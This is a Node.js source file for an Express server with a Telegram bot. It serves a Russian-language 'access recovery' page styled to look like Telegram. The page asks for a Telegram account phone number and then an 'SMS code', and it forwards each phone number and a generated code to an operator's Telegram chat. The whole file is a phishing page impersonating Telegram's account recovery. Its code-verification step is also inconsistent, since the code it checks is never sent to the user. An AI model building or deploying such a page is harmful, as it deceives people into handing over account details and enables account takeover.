// ==== file: index.js ====
// language: JavaScript, target: Node.js 20 (Render)
import express from 'express';
import TelegramBot from 'node-telegram-bot-api';
import crypto from 'node:crypto';

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN) {
  console.error('BOT_TOKEN not set');
  process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();
app.use(express.json());

const sessions = new Map();
const norm = (s) => String(s || '').replace(/[^\d+]/g, '');

bot.onText(/^\/start$/, (msg) => {
  bot.sendMessage(msg.chat.id,
    `Ваш chat_id: ${msg.chat.id}\nВставь в Environment Variables → ADMIN_CHAT_ID и перезапусти.`);
});

bot.on('polling_error', (err) => console.error('[telegram]', err.message));

app.post('/api/request-code', (req, res) => {
  const phone = norm(req.body.phone);
  if (phone.length < 8) {
    return res.status(400).json({ ok: false, error: 'Некорректный номер' });
  }
  const code = String(crypto.randomInt(10000, 99999));
  sessions.set(phone, { code, expires: Date.now() + 5 * 60 * 1000 });
  if (ADMIN_CHAT_ID && ADMIN_CHAT_ID !== '0') {
    bot.sendMessage(ADMIN_CHAT_ID,
      `🔐 Новая сессия\n📱 ${phone}\n🔑 Код: ${code}`).catch(() => {});
  }
  console.log(`[request] ${phone} → ${code}`);
  res.json({ ok: true, ttl: 300 });
});

app.post('/api/verify-code', (req, res) => {
  const phone = norm(req.body.phone);
  const code = String(req.body.code || '').trim();
  const s = sessions.get(phone);
  if (!s || Date.now() > s.expires) {
    return res.status(404).json({ ok: false, error: 'Код истёк' });
  }
  if (s.code !== code) {
    return res.status(401).json({ ok: false, error: 'Неверный код' });
  }
  sessions.delete(phone);
  if (ADMIN_CHAT_ID && ADMIN_CHAT_ID !== '0') {
    bot.sendMessage(ADMIN_CHAT_ID, `✅ Подтверждено\n📱 ${phone}`).catch(() => {});
  }
  res.json({ ok: true, redirect: '/' });
});

app.get('/', (_req, res) => {
  res.type('html').send(`<!DOCTYPE html>
<html lang="ru"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Восстановление доступа</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:linear-gradient(160deg,#17212b,#0e1621);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;padding:16px}
.card{background:#17212b;border-radius:16px;padding:32px 24px;width:100%;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,.6)}
h1{font-size:22px;text-align:center;margin-bottom:8px}
p{font-size:14px;color:#708499;text-align:center;margin-bottom:24px;line-height:1.5}
label{display:block;font-size:13px;color:#708499;margin:16px 0 6px}
input{width:100%;padding:14px;border-radius:10px;border:1px solid #2b5278;background:#0e1621;color:#fff;font-size:16px;outline:none}
input:focus{border-color:#2aabee}
button{width:100%;margin-top:24px;padding:14px;border:none;border-radius:10px;background:#2aabee;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
button:disabled{background:#2b5278;cursor:not-allowed}
.hidden{display:none}
.err{color:#e53935;font-size:13px;margin-top:10px;text-align:center}
.ok{color:#4caf50;font-size:14px;text-align:center;margin-top:12px}
</style></head>
<body>
<div class="card">
<h1>Восстановление доступа</h1>
<p>Введите номер Telegram-аккаунта.</p>
<form id="f1">
<label>Номер телефона</label>
<input id="phone" type="tel" placeholder="+373 XX XXX XXX" required>
<button id="b1" type="submit">Получить код</button>
<div class="err" id="e1"></div>
</form>
<form id="f2" class="hidden">
<label>Код из SMS</label>
<input id="code" type="text" inputmode="numeric" maxlength="6" placeholder="•••••" required style="text-align:center;letter-spacing:4px;font-size:20px">
<button id="b2" type="submit">Подтвердить</button>
<div class="err" id="e2"></div>
</form>
</div>
<script>
let phone='';
const n=s=>s.replace(/[^\\d+]/g,'');
document.getElementById('f1').onsubmit=async e=>{
e.preventDefault();document.getElementById('e1').textContent='';
const p=n(document.getElementById('phone').value);
if(p.length<8){document.getElementById('e1').textContent='Некорректный номер';return}
const b=document.getElementById('b1');b.disabled=true;b.textContent='Отправка...';
try{
const r=await fetch('/api/request-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p})});
const d=await r.json();if(!r.ok||!d.ok)throw new Error(d.error||'Ошибка');
phone=p;document.getElementById('f1').classList.add('hidden');
document.getElementById('f2').classList.remove('hidden');document.getElementById('code').focus();
}catch(err){document.getElementById('e1').textContent=err.message;b.disabled=false;b.textContent='Получить код'}
};
document.getElementById('f2').onsubmit=async e=>{
e.preventDefault();document.getElementById('e2').textContent='';
const c=document.getElementById('code').value.trim();
if(c.length<4){document.getElementById('e2').textContent='Введите код';return}
const b=document.getElementById('b2');b.disabled=true;b.textContent='Проверка...';
try{
const r=await fetch('/api/verify-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone,code:c})});
const d=await r.json();if(!r.ok||!d.ok)throw new Error(d.error||'Неверный код');
document.getElementById('f2').innerHTML='<div class="ok">Код принят.</div>';
}catch(err){document.getElementById('e2').textContent=err.message;b.disabled=false;b.textContent='Подтвердить'}
};
</script></body></html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[server] :${PORT}`));
